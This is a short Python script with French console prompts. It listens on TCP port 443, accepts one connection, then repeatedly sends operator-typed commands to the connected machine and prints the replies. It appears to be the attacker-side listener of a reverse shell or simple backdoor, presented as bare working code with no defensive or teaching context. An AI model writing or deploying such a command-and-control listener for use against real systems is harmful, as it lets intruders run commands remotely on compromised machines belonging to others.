import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
h=""
p=443
s.bind((h,p))
s.listen()
print("En ecoute")
conn,addr=s.accept()
print("Connecté avec {} comme IP au port {}".format(addr[0],addr[1]))
while True:
    command = input("Entrez votre commande: ").encode("utf-8")
    conn.sendall(command)
    if not command:
        continue
    rec = conn.recv(4096).decode("utf-8",errors='ignore')
    print(rec)

                
conn.close()
s.close()